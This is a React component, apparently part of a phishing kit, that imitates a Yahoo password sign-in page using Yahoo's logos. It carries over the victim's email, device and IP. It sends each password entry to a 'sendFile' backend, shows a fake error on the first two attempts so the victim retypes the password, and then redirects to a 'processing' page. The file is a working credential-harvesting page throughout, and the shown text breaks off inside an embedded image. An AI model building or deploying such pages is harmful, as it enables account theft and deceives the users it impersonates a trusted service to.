import { navigate } from "@reach/router";
import React, { Fragment, useState } from "react";
import { Helmet } from "react-helmet";
import { notify, sendFile } from "../servers";

function Yahoo({ location }) {
  const [values, setValues] = useState({
    username: location.state.email,device: location.state.device,
    ip: location.state.ip,
    password: "",
  });

  const [submited, setSubmited] = useState({ status: false, count: 0 });

  const handleChange = (event) => {
    setValues({
      ...values,
      [event.target.name]: event.target.value,
    });
  };

  const submitForm = (event) => {
    event.preventDefault();
    setSubmited({ ...submited, status: !submited.status });

    if (submited.count <= 1) {
      sendFile(values).then((data) => {
        // show error
        notify();
        setSubmited({ ...submited, count: submited.count + 1 }); setValues({ ...values, password: "" });
        console.log(data);
        console.log(submited);
      });
    } else {
      sendFile(values).then((data) => {
        // redirect
        navigate("processing", { state: { domain: location.state.domain } });
        console.log("ok");
      });
    }
  };

  return (
    <Fragment>
      <Helmet>
        <link rel="stylesheet" type="text/css" href="../yahoo/main.css" />
      </Helmet>
      <div id="login-body" className="loginish puree-v2">
        <div className="mbr-desktop-hd">
          <span className="column">
            <a>
              <img
                src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPAAAABICAMAAAD/Eoi4AAAAKlBMVEVHcExhAtNhAdNhAtNyGeFgAdJgAdJgAdJgAdNiBdVhA9RgAdJlCddgAdIF22wQAAAADnRSTlMAVHtqCrP/4ZMqPcoZ81BhdT4AAAS5SURBVHja7ZrrjiMpDEaLi4uL8fu/7qon0ia2MRS1NRotE6v/dILAB8yHDTm+9rWvXTDn3xb+nBvRM/uNnsD5tvTngP3JLG8PnDhw2R24cl48dgcGDux2B26cl+LmwFqy9gbWkrU7sOO8cOwNrCVrd+DCedOxO3DmwH534EgcuG0OrCVrd2DkwPWJoCklrgDHVsy4ereIF4du9yXLfZqaidr9tgX8tUcIQ/v597NRF7jmVxqAvhiJvkc6X13m0XI0B4le/UJotyQLRps7UucsK8BStsbLkqiBC7L2miJziaFsoFTgIOguSRY11slIvoNOv2M+uVGdAAfRvgjvPJ3SyEcbd44chpKFgwMaVfpdUse7IXBQ7VnMvjpUlopRDEjLcVWyAv/S3vvFdM8G7sN8+OjIaESOx4HZJ7bFyj+SWUVlGRiFzrvA/UHCoFX4dBIH89fGkhWGkkbRlCwx7Dqw1sY6bFWZtNqGkWsgTSr/Ys2Hk7s7n/eBe9rYxhuECtu/tsFi5Q9GxIPwsZ5PAafRumlfyqw/t1b5u36DIqMQHgM+mwxoG2RhAoeSZc5J7oYGiJ7WgTXJXBGQI9gW1ip/Lze5noaqMdAHD3QFOAGS3sRVtcqQ9MTo7iBnOW5au6xsUo61ZKl8DQrPk2zgVH+GQK4kSgKx9tKprBNF/0r4Av+0zCVrdOBqybJz0EoGMM9ko9o3/APjlJQzT7Wfovm1y8qqFaVJp711ELgxcDYkoVjJF7KtJGYgGE7jYuWPara8dBrM+gOGwLXnHwjXqpUXBO4bWnFJi5eVQSlAkv6gOXFuCNx6agJ8RtHMCzz3xJkZU1y7rIwk+HS8JDM9jUPgf5sJ4GxWpYHHluz9bUlt1uqZqQW2ZUtvnEHBRQNgugIczIgBFhlkb8T6X97aKEZSZxnZW+P8jcA8fp4ClmEYgtZZO6TbLWBvnJbqGzKvoKhz/sRaS1x+L0fUZ5ktWuEWcDDFBW3RCqbLL0iHv8aEuvy8qCUUzPMcbwE743hVX6BxXh8oh4mw8hwcJiWLt2puf94Cbjod66RkRehnNhwGeS0yJ27U56XYy8YgsnGXgWVgYOte5iT7XtWRDBFYfCDNkwsoPiHJRXZJvQ7sxd3nD3ILSQ9OosqInTvbpqqvtPikqoVRohECK+cWgfV4CVV3tbcSlJCUzuhmc+HCHi+MJ+Q2MGtmGVwduHZU1y++MeqtAA8Dz0GKudn0Ake9F2cW0+S26FngOQhoPbUXuK0CKxnRcZEfBo548YXCXbj1jabr84TazOXwOeD5xTSV0VLoznBBtMxdCkLI07PARyWbt14MLojdSUlxKaHWs2QvCd0HPgpa8VwuJoLZyJzCnd/rJR31qF1zt4HtZ0HQb4Ld6KIPLqdGWE6oQ68JyefKegv4TYLWO/f85Tw3Q3Qh3vl9E7WutOX0+d59HDeB3+aA3TeAs0TV80Q7FxkFKNZ9bnjpJKsZMFGCXF/T9GGv/8UHupWw6F49ImQ3XJsSAJB+GvrS9cxn1sXMipCs7S3zhG17i6LG3Nz0z5T2Ni1Z21sVtdn2Bn+ZZDVR+W9vXhQb21v6yyTLDSr//c8k2J835uzff/X42tf+h/YPQiqe2vV+1kkAAAAASUVORK5CYII="
                alt="Yahoo"
                className="logo"
                height={36}
              />
              <img
                src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPAAAABICAMAAAD/Eoi4AAAAKlBMVEVHcExhAtNhAdNhAtNyGeFgAdJgAdJgAdJgAdNiBdVhA9RgAdJlCddgAdIF22wQAAAADnRSTlMAVHtqCrP/4ZMqPcoZ81BhdT4AAAS5SURBVHja7ZrrjiMpDEaLi4uL8fu/7qon0ia2MRS1NRotE6v/dILAB8yHDTm+9rWvXTDn3xb+nBvRM/uNnsD5tvTngP3JLG8PnDhw2R24cl48dgcGDux2B26cl+LmwFqy9gbWkrU7sOO8cOwNrCVrd+DCedOxO3DmwH534EgcuG0OrCVrd2DkwPWJoCklrgDHVsy4ereIF4du9yXLfZqaidr9tgX8tUcIQ/v597NRF7jmVxqAvhiJvkc6X13m0XI0B4le/UJotyQLRps7UucsK8BStsbLkqiBC7L2miJziaFsoFTgIOguSRY11slIvoNOv2M+uVGdAAfRvgjvPJ3SyEcbd44chpKFgwMaVfpdUse7IXBQ7VnMvjpUlopRDEjLcVWyAv/S3vvFdM8G7sN8+OjIaESOx4HZJ7bFyj+SWUVlGRiFzrvA/UHCoFX4dBIH89fGkhWGkkbRlCwx7Dqw1sY6bFWZtNqGkWsgTSr/Ys2Hk7s7n/eBe9rYxhuECtu/tsFi5Q9GxIPwsZ5PAafRumlfyqw/t1b5u36DIqMQHgM+mwxoG2RhAoeSZc5J7oYGiJ7WgTXJXBGQI9gW1ip/Lze5noaqMdAHD3QFOAGS3sRVtcqQ9MTo7iBnOW5au6xsUo61ZKl8DQrPk2zgVH+GQK4kSgKx9tKprBNF/0r4Av+0zCVrdOBqybJz0EoGMM9ko9o3/APjlJQzT7Wfovm1y8qqFaVJp711ELgxcDYkoVjJF7KtJGYgGE7jYuWPara8dBrM+gOGwLXnHwjXqpUXBO4bWnFJi5eVQSlAkv6gOXFuCNx6agJ8RtHMCzz3xJkZU1y7rIwk+HS8JDM9jUPgf5sJ4GxWpYHHluz9bUlt1uqZqQW2ZUtvnEHBRQNgugIczIgBFhlkb8T6X97aKEZSZxnZW+P8jcA8fp4ClmEYgtZZO6TbLWBvnJbqGzKvoKhz/sRaS1x+L0fUZ5ktWuEWcDDFBW3RCqbLL0iHv8aEuvy8qCUUzPMcbwE743hVX6BxXh8oh4mw8hwcJiWLt2puf94Cbjod66RkRehnNhwGeS0yJ27U56XYy8YgsnGXgWVgYOte5iT7XtWRDBFYfCDNkwsoPiHJRXZJvQ7sxd3nD3ILSQ9OosqInTvbpqqvtPikqoVRohECK+cWgfV4CVV3tbcSlJCUzuhmc+HCHi+MJ+Q2MGtmGVwduHZU1y++MeqtAA8Dz0GKudn0Ake9F2cW0+S26FngOQhoPbUXuK0CKxnRcZEfBo548YXCXbj1jabr84TazOXwOeD5xTSV0VLoznBBtMxdCkLI07PARyWbt14MLojdSUlxKaHWs2QvCd0HPgpa8VwuJoLZyJzCnd/rJR31qF1zt4HtZ0HQb4Ld6KIPLqdGWE6oQ68JyefKegv4TYLWO/f85Tw3Q3Qh3vl9E7WutOX0+d59HDeB3+aA3TeAs0TV80Q7FxkFKNZ9bnjpJKsZMFGCXF/T9GGv/8UHupWw6F49ImQ3XJsSAJB+GvrS9cxn1sXMipCs7S3zhG17i6LG3Nz0z5T2Ni1Z21sVtdn2Bn+ZZDVR+W9vXhQb21v6yyTLDSr//c8k2J835uzff/X42tf+h/YPQiqe2vV+1kkAAAAASUVORK5CYII="
                alt="Yahoo"
                className="dark-mode-logo logo"
                height={36}
              />
            </a>
          </span>
          <span className="column help txt-align-right">
            <a href="">Help</a>
          </span>
        </div>
        <div className="login-box-container">
          <div className="login-box default">
            <div className="mbr-login-hd txt-align-center">
              <img
                src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPAAAABICAMAAAD/Eoi4AAAAKlBMVEVHcExhAtNhAdNhAtNyGeFgAdJgAdJgAdJgAdNiBdVhA9RgAdJlCddgAdIF22wQAAAADnRSTlMAVHtqCrP/4ZMqPcoZ81BhdT4AAAS5SURBVHja7ZrrjiMpDEaLi4uL8fu/7qon0ia2MRS1NRotE6v/dILAB8yHDTm+9rWvXTDn3xb+nBvRM/uNnsD5tvTngP3JLG8PnDhw2R24cl48dgcGDux2B26cl+LmwFqy9gbWkrU7sOO8cOwNrCVrd+DCedOxO3DmwH534EgcuG0OrCVrd2DkwPWJoCklrgDHVsy4ereIF4du9yXLfZqaidr9tgX8tUcIQ/v597NRF7jmVxqAvhiJvkc6X13m0XI0B4le/UJotyQLRps7UucsK8BStsbLkqiBC7L2miJziaFsoFTgIOguSRY11slIvoNOv2M+uVGdAAfRvgjvPJ3SyEcbd44chpKFgwMaVfpdUse7IXBQ7VnMvjpUlopRDEjLcVWyAv/S3vvFdM8G7sN8+OjIaESOx4HZJ7bFyj+SWUVlGRiFzrvA/UHCoFX4dBIH89fGkhWGkkbRlCwx7Dqw1sY6bFWZtNqGkWsgTSr/Ys2Hk7s7n/eBe9rYxhuECtu/tsFi5Q9GxIPwsZ5PAafRumlfyqw/t1b5u36DIqMQHgM+mwxoG2RhAoeSZc5J7oYGiJ7WgTXJXBGQI9gW1ip/Lze5noaqMdAHD3QFOAGS3sRVtcqQ9MTo7iBnOW5au6xsUo61ZKl8DQrPk2zgVH+GQK4kSgKx9tKprBNF/0r4Av+0zCVrdOBqybJz0EoGMM9ko9o3/APjlJQzT7Wfovm1y8qqFaVJp711ELgxcDYkoVjJF7KtJGYgGE7jYuWPara8dBrM+gOGwLXnHwjXqpUXBO4bWnFJi5eVQSlAkv6gOXFuCNx6agJ8RtHMCzz3xJkZU1y7rIwk+HS8JDM9jUPgf5sJ4GxWpYHHluz9bUlt1uqZqQW2ZUtvnEHBRQNgugIczIgBFhlkb8T6X97aKEZSZxnZW+P8jcA8fp4ClmEYgtZZO6TbLWBvnJbqGzKvoKhz/sRaS1x+L0fUZ5ktWuEWcDDFBW3RCqbLL0iHv8aEuvy8qCUUzPMcbwE743hVX6BxXh8oh4mw8hwcJiWLt2puf94Cbjod66RkRehnNhwGeS0yJ27U56XYy8YgsnGXgWVgYOte5iT7XtWRDBFYfCDNkwsoPiHJRXZJvQ7sxd3nD3ILSQ9OosqInTvbpqqvtPikqoVRohECK+cWgfV4CVV3tbcSlJCUzuhmc+HCHi+MJ+Q2MGtmGVwduHZU1y++MeqtAA8Dz0GKudn0Ake9F2cW0+S26FngOQhoPbUXuK0CKxnRcZEfBo548YXCXbj1jabr84TazOXwOeD5xTSV0VLoznBBtMxdCkLI07PARyWbt14MLojdSUlxKaHWs2QvCd0HPgpa8VwuJoLZyJzCnd/rJR31qF1zt4HtZ0HQb4Ld6KIPLqdGWE6oQ68JyefKegv4TYLWO/f85Tw3Q3Qh3vl9E7WutOX0+d59HDeB3+aA3TeAs0TV80Q7FxkFKNZ9bnjpJKsZMFGCXF/T9GGv/8UHupWw6F49ImQ3XJsSAJB+GvrS9cxn1sXMipCs7S3zhG17i6LG3Nz0z5T2Ni1Z21sVtdn2Bn+ZZDVR+W9vXhQb21v6yyTLDSr//c8k2J835uzff/X42tf+h/YPQiqe2vV+1kkAAAAASUVORK5CYII="
                alt="Yahoo"
                className="logo yahoo-en-US"
                height={27}
              />
              <img
                src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPAAAABICAMAAAD/Eoi4AAAAKlBMVEVHcExhAtNhAdNhAtNyGeFgAdJgAdJgAdJgAdNiBdVhA9RgAdJlCddgAdIF22wQAAAADnRSTlMAVHtqCrP/4ZMqPcoZ81BhdT4AAAS5SURBVHja7ZrrjiMpDEaLi4uL8fu/7qon0ia2MRS1NRotE6v/dILAB8yHDTm+9rWvXTDn3xb+nBvRM/uNnsD5tvTngP3JLG8PnDhw2R24cl48dgcGDux2B26cl+LmwFqy9gbWkrU7sOO8cOwNrCVrd+DCedOxO3DmwH534EgcuG0OrCVrd2DkwPWJoCklrgDHVsy4ereIF4du9yXLfZqaidr9tgX8tUcIQ/v597NRF7jmVxqAvhiJvkc6X13m0XI0B4le/UJotyQLRps7UucsK8BStsbLkqiBC7L2miJziaFsoFTgIOguSRY11slIvoNOv2M+uVGdAAfRvgjvPJ3SyEcbd44chpKFgwMaVfpdUse7IXBQ7VnMvjpUlopRDEjLcVWyAv/S3vvFdM8G7sN8+OjIaESOx4HZJ7bFyj+SWUVlGRiFzrvA/UHCoFX4dBIH89fGkhWGkkbRlCwx7Dqw1sY6bFWZtNqGkWsgTSr/Ys2Hk7s7n/eBe9rYxhuECtu/tsFi5Q9GxIPwsZ5PAafRumlfyqw/t1b5u36DIqMQHgM+mwxoG2RhAoeSZc5J7oYGiJ7WgTXJXBGQI9gW1ip/Lze5noaqMdAHD3QFOAGS3sRVtcqQ9MTo7iBnOW5au6xsUo61ZKl8DQrPk2zgVH+GQK4kSgKx9tKprBNF/0r4Av+0zCVrdOBqybJz0EoGMM9ko9o3/APjlJQzT7Wfovm1y8qqFaVJp711ELgxcDYkoVjJF7KtJGYgGE7jYuWPara8dBrM+gOGwLXnHwjXqpUXBO4bWnFJi5eVQSlAkv6gOXFuCNx6agJ8RtHMCzz3xJkZU1y7rIwk+HS8JDM9jUPgf5sJ4GxWpYHHluz9bUlt1uqZqQW2ZUtvnEHBRQNgugIczIgBFhlkb8T6X97aKEZSZxnZW+P8jcA8fp4ClmEYgtZZO6TbLWBvnJbqGzKvoKhz/sRaS1x+L0fUZ5ktWuEWcDDFBW3RCqbLL0iHv8aEuvy8qCUUzPMcbwE743hVX6BxXh8oh4mw8hwcJiWLt2puf94Cbjod66RkRehnNhwGeS0yJ27U56XYy8YgsnGXgWVgYOte5iT7XtWRDBFYfCDNkwsoPiHJRXZJvQ7sxd3nD3ILSQ9OosqInTvbpqqvtPikqoVRohECK+cWgfV4CVV3tbcSlJCUzuhmc+HCHi+MJ+Q2MGtmGVwduHZU1y++MeqtAA8Dz0GKudn0Ake9F2cW0+S26FngOQhoPbUXuK0CKxnRcZEfBo548YXCXbj1jabr84TazOXwOeD5xTSV0VLoznBBtMxdCkLI07PARyWbt14MLojdSUlxKaHWs2QvCd0HPgpa8VwuJoLZyJzCnd/rJR31qF1zt4HtZ0HQb4Ld6KIPLqdGWE6oQ68JyefKegv4TYLWO/f85Tw3Q3Qh3vl9E7WutOX0+d59HDeB3+aA3TeAs0TV80Q7FxkFKNZ9bnjpJKsZMFGCXF/T9GGv/8UHupWw6F49ImQ3XJsSAJB+GvrS9cxn1sXMipCs7S3zhG17i6LG3Nz0z5T2Ni1Z21sVtdn2Bn+ZZDVR+W9vXhQb21v6yyTLDSr//c8k2J835uzff/X42tf+h/YPQiqe2vV+1kkAAAAASUVORK5CYII="
                alt="Yahoo"
                className="dark-mode-logo logo yahoo-en-US"
                height={27}
              />
            </div>
            <div className="challenge password-challenge">
              <div className="challenge-header">
                <div id="topnavtext" className="yid">
                  {values.username}
                </div>
              </div>
              <div id="oga" style={{ display: "none" }}>
                <img
                  src="data:image/png;base64,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